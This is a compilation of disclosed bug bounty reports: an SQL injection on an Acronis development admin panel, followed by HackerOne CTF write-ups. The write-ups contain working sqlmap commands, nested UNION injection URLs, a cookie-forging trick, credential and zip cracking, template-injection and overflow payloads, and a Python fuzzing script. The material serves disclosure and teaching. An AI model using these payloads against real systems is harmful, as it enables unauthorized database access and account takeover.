- **Bounty:** 250 usd
- **Disclosed:** 2021-06-22T18:12:42.683Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I found an Acronis domain and started hunting on it. During my hunting, I found an admin panel and was able to access this panel (separate report inbound). It was easy to gain access to this panel, and I was not sure if it was for testing purposes or a genuine admin panel. I played around with minor settings to see if I could change some content on the main page and ensure that this was a real admin panel. I put a quote in the search bar for indexing dashboard pages and intercepted the request. Then I realized all requests are through the administrator API, which I now have access to and an authorization bearer token. Admin API access, combined with the entire site index in the panel (including all content for all pages), confirmed that I am in a real live admin panel.

Next, I noticed the quote returned a server error in the API. I  tested an SQL injection (along with one other critical bug) and confirmed its presence. I can view three databases, and I dumped the table names for one of the databases to see what type of information it contained. In the database, there are tables named `users`, `password_resets`, and more. Furthermore, the login redirected to the main Acronis website, so I knew this data is quite sensitive. I only explored nonsensitive data. The extent of what I did with the SQL injection is diclosed in this report below.

I understand this domain is not rated critical, but I set it because of the severity of the bug.

**Steps to Reproduce:**
Visit the admin panel for Acronis hosting.

    https://admin.acronis.host/

Login with the given credentials and visit the pages section.

    https://admin.acronis.host/#/pages

Here input any data and intercept the request. Below is a copy of the raw request.

```text
GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1
Host: dev.acronis.host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE
Origin: https://admin.acronis.host
Connection: close
Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372

```

The `search` parameter is vulnerable. Save the request I provided as a text file on your desktop and run the following command with SQLMap.
```
sudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs
```

This will drop the following three databases.

{F906431}

Next, I used the following flags in SQLMap `-D acronis_site --tables`. The `-D` tells SQLMap which database and `--tables` tells SQLMap to drop table names. I only explored nonsensitive information.
```text
Database: acronis_site
[24 tables]
+----------------------+
| awards               |
| failed_jobs          |
| files                |
| history_pages        |
| locales              |
| migrations           |
| page_products        |
| page_translations    |
| pages                |
| pages_1              |
| pages_2              |
| pages_3              |
| password_resets      |
| product_prices       |
| product_translations |
| products             |
| products_1           |
| related_products     |
| related_tags         |
| resources            |
| tags                 |
| users                |
| variables            |
| webinars             |
+----------------------+
```

After seeing this, I ceased testing this SQL injection and reported the vulnerability directly to your team.

## Impact

Server-side SQL injection leading to database access and exposure of sensitive information. Reading this information likely allows an attacker to execute remote code by stealing admin password resets and user information.

**Summary (team):**

SQL injection was possible on `admin.acronis.host` web service that was used for development purposes only. Acronis security team confirmed that the service did not contain any sensitive data or data of real users.

---

### [100K CTF's Writeup](https://hackerone.com/reports/1216591)

- **Report ID:** `1216591`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @dexter0us
- **Bounty:** - usd
- **Disclosed:** 2021-06-21T20:44:11.411Z
- **CVE(s):** -

**Summary (team):**

Limited disclosure based on researcher's request.

**Summary (researcher):**

Hello everyone,

We are one of the winners of 100k CCC CTF and we would like to congratulate all the other winners of the CTF as well.

Here is the link to our write-up https://blog.dexter0us.com/posts/ccc-h1ctf/ hope you guys enjoy reading it and learn something new from it. 

:)

---

### [ccc.h1ctf.com CTF](https://hackerone.com/reports/1215919)

- **Report ID:** `1215919`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @erbbysam
- **Bounty:** - usd
- **Disclosed:** 2021-06-18T04:59:16.408Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Claiming the flag, writeup to follow.
██████████
██████

## Impact

.

---

### [H1-CTF 100k Solution - Congratz on the 100k Rep todayisnew](https://hackerone.com/reports/1216408)

- **Report ID:** `1216408`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @w31rd0
- **Bounty:** - usd
- **Disclosed:** 2021-06-17T22:27:35.628Z
- **CVE(s):** -

**Vulnerability Information:**

Sharing the final flag for now. Writeup will come soon 
`██████`

██████████

## Impact

Takeover of admin account :)

---

### [SQLI on uberpartner.eu leads to exposure of sensitive user data of Uber partners](https://hackerone.com/reports/361623)

- **Report ID:** `361623`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Uber
- **Reporter:** @healdb
- **Bounty:** 1500 usd
- **Disclosed:** 2021-03-15T20:56:28.831Z
- **CVE(s):** -

**Summary (team):**

The Uber EU test site has a SQLI vulnerability exposing several databased and based on the database names, may expose hashed passwords and Uber partner information.

**Summary (researcher):**

Basic time-based SQLI that disclosed a database on a Uber EU test site.

Check out my blog https://healdb.tech/blog/ or my Twitter https://twitter.com/heald_ben
for some Bug Bounty tool releases and blogs!

---

### [Taking Grinch Down To Save Holidays](https://hackerone.com/reports/1067037)

- **Report ID:** `1067037`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** h1-ctf
- **Reporter:** @akshansh
- **Bounty:** - usd
- **Disclosed:** 2021-01-22T18:58:18.365Z
- **CVE(s):** -

**Vulnerability Information:**

Hi thank you Hackerone and Adam for organizing the CTF, this had honestly helped me to learn good skills and techniques.

The CTF  began with the scope:  hackyholidays.h1ctf.com and mission to take down grinch
So here's a quick visual summary of all the challenges

{F1131175}  {F1131176}


# 1. Grinch Robots
In this challenge we needed to find grinch robots, opening the robots.txt file destroyed the robots and gave us flags


## Steps to reproduce:
1. Go to https://hackyholidays.h1ctf.com/robots.txt
2. In the page you would find the flag
3. ~~Grinch RobotsDown~~

### flag{48104912-28b0-494a-9995-a203d1e261e7}

# 2. s3cr3t-ar3a
In this challenge, we had got a clue from robots.txt about a page s3cr3t-ar3a, Upon visiting the page we see that it displayed page was moved to other location but Grinch forgot about the page source which had jquery.min.js that held the flag in order to get the flag we needed to merge all the pieces which could be easily done from Chrome dev-tools.

{F1131181}

## Steps:
1. Go to https://hackyholidays.h1ctf.com/s3cr3t-ar3a and view page source  
2. In there we can see a js file named jquery.min.js
3. Use a beautifier to easily see contents and now copy the variables from 
``` h1_0='la',h1_1='}',h1_2='',h1_3='f',h1_4='g',h1_5='{b7ebcb75',h1_6='8454-',h1_7='cfb9574459f7',h1_8='-9100-4f91-'  ```
4. In chrome dev console paste this and then enter  ``` h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 ``` this will reveal the flag
5.  ~~Grinch Secrets Exposed~~

###  flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

# 3. People Rater
Grinch has rated people with a lot of hate but he forgot that  by mistake he rated himself and hid the secrets in his ratings,
when we click on any person  ratings we observe that to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= a request is made to fetch every person ratings the id= value is base64 encoded, on the page value starts from {"id":2} to {"id":17} replacing this value with {"id":1} base64 i.e eyJpZCI6MX0=  gave the flag


## Steps to reproduce:
1. Go to https://hackyholidays.h1ctf.com/people-rater, press any name, and observe the background request in burp
2. The request looks like 

```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
```

3. Here upon decoding this value it gives {"id":2}, hmm strange starting value with 2 
4. So i tried {"id":1} encoded eyJpZCI6MX0= and send request again 

{F1131183}

```
Request
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=

Response:
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

``` 
3.~~Grinch Rater Down~~
### flag{b705fb11-fb55-442f-847f-0931be82ed9a}



# 4.Grinch Swag-Shop

Soon after this attack grinch launched his swag shop to ruin the fun, the shop only allowed to access via login at first look after fuzzing a bit I found that the swag-shop was built with API's also so I used my API wordlist for directories fuzzing which gave out /session & /user, session here gave us session values of users {"user,"cookie"} values only among them one had user value since accessing /user was giving missing required field I fuzzed /user with [ARJUN ](https://github.com/s0md3v/Arjun) and got uuid as a parameter so I sent a request as /api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 which gave the flag

{F1131189}

## Steps:
1. Go to  https://hackyholidays.h1ctf.com/swag-shop/api
2.  Now launch the API requests we retrieve flag as shown below


```
REQUEST1
https://hackyholidays.h1ctf.com/swag-shop/api/sessions

RESPONSE1

{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}

DECODED

{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}","{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}","{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}","{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}","{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}","{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}","{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}","{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}

REQUEST2
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

RESPONSE2
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

```

3.~~Grinch Shop Down~~

### flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

# 5.Secure Login
After Grinch swag shop was taken down through Api he  immediately stopped the Api and added only password-based login which he thought was secure we took it down by common Bruteforce list which was listed on Adam's website   ctfchallenge.co.uk, after logging in we found cookie was checking if a user is an admin or not we changed it to true by which we could see a file which was protected by a password but we break into in seconds through frackzip

## Steps:
1. Go to the login page and enter any username password and send it to the intruder now add only the username field. 
2. Now use adam's website common username list and in  intruder, results search for the Invalid password response we found ```access``` as a valid username
{F1131196}

3. Now we use a common password list through which we get ```computer``` as password
4. After login we see a blank page but observing cookies 

{F1131204}

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
we changed it to 
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

5.Now we can see a file name my_secure_files_not_for_you.zip 
6.Even though it was password protected i used the tool fcrackzip using rockyou.txt which gave the password as hahahaha
{F1131198}
7.So we got the flag and took down the Login system of Grinch again
8.~~Grinch Secure Login Down~~

### flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

# 6. Grinch Diary
Grinch had changed his systems and he's now taking a new diary for writing all the bad works he will do, grinch protected secret files through so  its not in our access

Here as soon as we opened the https://hackyholidays.h1ctf.com/my-diary/ the page automatically appended template=entries.html hmm interesting i was using wappalyzer which indicated the page is using PHP so I tried with index.php and gave a blank page upon viewing its source got the code which revealed that our flag was in secretadmin.php since it would not allow directly to access this due to check  

```
$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
``` 

So I prepared a value  secretadmsecretadmadmin.phpin.phpin.php which upon 1st check would leave secretadmsecretadmin.phpin.php & on second check would give us secretadmin.php

## Steps:
1. Go to https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php
2. We get flag as
{F1131268}

3. ~~Burned Grinch Diary~~

### flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

# 7. Hate-Emails

Grinch now came back with a new app which would send hate emails to others he has a special header which only he could include thats what he thinks but he missed to protect the template data check as preview data was lacking check through which we included the header and accessed his mail secrets

On the url  https://hackyholidays.h1ctf.com/hate-mail-generator/ a quick directory search gave us /templates/ which had 3 entries 
```
cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46

```
out of which 38dhs_admins_only_header.html   was forbidden to access if we try to include that  in markdown  as {{template:38dhs_admins_only_header.html}}  this would also not work and give response as ```You do not have access to the file 38dhs_admins_only_header.html```  . The request body that was going contained

```
preview_markup=hIII{{template:cbdj3_grinch_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

Since insertion was not possible directly in preview_markup i tried inserting admin header in preview_data as

```
preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}
```


##Steps:
1. Open the url https://hackyholidays.h1ctf.com/hate-mail-generator/new/  and click on preview
2. Now intercept the request and replace preview data with ``` preview_data={"name":"{{template:38dhs_admins_only_header.html}}```
3. We get our flag in response
{F1131285}
4. ~~Hate Mailing Down~~

### flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}


# 8. Grinch Forum
Grinch upon seeing his mistakes now decided to supersecure his new idea and built a forum for publishing his bad ideas but he was also clever enough to expose some secrets on github and burn himself again.

As landing on the page it seemed secured with functionality of only login and view of posts a quick directory search gave a /phpmyadmin page which looked as custom built bruteforcing both login and phpmyadmin didnt gave any results , hmm but since grinch was clever enough he exposed the code for the forum in his github [Grinch-Network](https://github.com/Grinch-Networks/forum) in one of his old commits
  {F1131310}  
small fix he left dbconnect credentials  
{F1131315}  

which was of phpmyadmin  ``` forum','6HgeAZ0qC9T6CQIqJpD ``` upon login he see a user grinch hash ``` 35D652126CA1706B59DB02C93E0C9FBF```  then i used crackstation to decode the password of grinch which came as ```BahHumbug``` 

 {F1131344}   {F1131343}

and now when we login we get the secret plans post which upon opening gave the flag


## Steps:
1. Go to https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
2. Copy the dbconnect credentials ``` forum','6HgeAZ0qC9T6CQIqJpD ```   and login to https://hackyholidays.h1ctf.com/forum/phpmyadmin
3.  In  phpmyadmin see the users table we can see grinch password hash ```35D652126CA1706B59DB02C93E0C9FBF```
4.  Now copy the hash and paste in https://crackstation.net/ this will give password as  ```BahHumbug```
5. Now simply login with this username and password and browse to https://hackyholidays.h1ctf.com/forum/3/2
{F1131342}
6. ~~ Forum Closed~~

### flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

# 9. Evil-Quiz 
Grinch came with a new app called evil-quiz the app would require you to input your name and then ask questions and at the end tell level of your evilness but he was foolish as he did not used parameterized queries

Upon starting the quiz we see that we are asked to enter a name at the end of the quiz in results we can see
{F1131361} 
that our name was checked against current players and then it returns number of matches this triggered the ideas of second order SQL injection as here the query is not directly fired its fired after event of completing the quiz and it was the case of second order SQL injection sqlmap has a automated way to exploit and dump the tables
and therefore after dumping the database we got login credentials and after login we got the flag.
  
## Steps:
1. First enter open the quiz and copy cookie value
2. Now via sqlmap fire this query 

  ```
 python sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" --dbs"
```

3.This will output as ```quiz``` as a database next for tables we add  --tables -D quiz  to know table name , tebale name of our interest was ```admin```
4.Now to fully dump this quiz database we fire

```
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" -T admin -D quiz  --dump
```
Username-admin
Password:S3creT_p4ssw0rd-$

{F1131384}
5.After Login we get the flag
{F1131389}
6.~~Lock Evil-Quiz~~

### flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

# 10.Signup Manager
Grinch launched a signup manager but this time he exposed the source code which helped to find the overflow flaw in input fields and helped to become an admin to get the flag

On visiting the page in source we can see mention of  ```<!-- See README.md for assistance -->``` when we downlaoded [Readme.md](https://hackyholidays.h1ctf.com/signup-manager/README.md{ it was an install guide for this app 
{F1131401} 
so this mentioned to unzip signupmanager.zip which was the source code as we downloaded it we can see all the files but the interesting one was index.php as it holded the logic for signup and admin check, as we could see during signup 

{F1131402}
'N' is automatically appended to line to prevent from user becoming admin if we check 
{F1131426} 
we can see to check wheter a user is admin or not line 113 is checked for Y value if its there then admin access will be granted so we need to pass Y somehow to line 113 the way it can be done here is overflowing age value with exponential value such as 1e9 which equals to 1,000,000,000 since this would feed into line 79 to 89 taking 10 characters note during signup firstname and lastname are given 15 chars limit so 89+30=119 so now we can easily add Y at line 113 just we need to send lastname as YYYYYYYYY and adjust other chars such that line 113 becomes Y.

## Steps:
1. Go to https://hackyholidays.h1ctf.com/signup-manager/
2. Now enter the following payload as request body

```
action=signup&username=adminbb&password=adminbb&age=1e9&firstname=YYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYY
```
3.We get access to flag and next chall url

{F1131432}

### flag{99309f0f-1752-44a5-af1e-a03e4150757d}



# 11. Grinch Double Evil
Grinch became double evil by launching the new app at  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 he tricked the people to believe at first layer injection with rabbit hole but deep down he couldnt protect api and login credentials.


This was the most fun and new learning experience for me at first look we see three Xmas albums request goes to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash= here we had three values and for each value when a request goes image data is returned in form of 

```
/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
``` 

then a  url is then queried again  to fetch that image 

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
```
At first when we tried
After fuzzing with directory search we got /api/
{F1131456} but at this point we really didnt have ideas how to use except get  a response that we cannot visit from our IP after trying an SQL Injection on 
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=  i was like yes but here this single injection was a rabbit hole and didnt returned any useful data only 

```
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

So after a bit waiting at a dead end ,in discord Adam dropped a hint {F1131463} this was from INCEPTION here this meant of  a double dream sequence and clearly for our challenge this meant for SQL Injection as double SQL injection so i tried with

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'1'='0",NULL,"test'"--+-
```
returns only two rows while 
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'0'='0",NULL,"test'"--+-
```

returned all the rows now we now needed to include with file names so as test we try /api/  /api/test/

```
1. /api/
Req-a
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=6860'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/\"--+-",NULL,"test'"--+-
Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Response : Invalid content type detected

2. /api/test/
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/test\"--+-",NULL,"test'"--+-

Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3Rlc3QiLCJhdXRoIjoiOWQ0M2MwMDQ4MjMzNWFiYzhjZmRmNjM3YzAwNWJkZDYifQ==

Response: Expected HTTP status 200, Received: 404
```

So here now we need to fuzz the /api/  i have used 2 files for [ files](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) and [parameters](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt)
since this could not be done by any tool in my knowledge i used a simple python script as:

```
payloads=open('apiwordlist.txt',"r")
sql1='''33230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/'''
sql2='''\"--+-",NULL,"test'"--+-'''
url='https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=+sql1+payloads+sql2'

t1=requests.get(url).text
searchdata=re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", t1).group(1)
t2=requests.get("http://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=+searchdata")

if "Received: 404" not in t2.text:
    print(t2.text, payloads)

```

Now after fuzzing we got ```/user and /ping``` as a directory then again we used this time paramter bruteforcing after /user?+payloads which returned us with ```username and password```  as valid parameters now to exfil the values in api we can use % character which would return us with if value/ like  exists so for that we fuzzed with the same logic in iterations as 
and payloads with alphanumeric  a-z0-9
 username as /api/user?username=a%
password as  /api/user?password=a% which gave values 
```
/api/user?username=grinchadmin%
/api/user?password=s4nt4sucks%
```

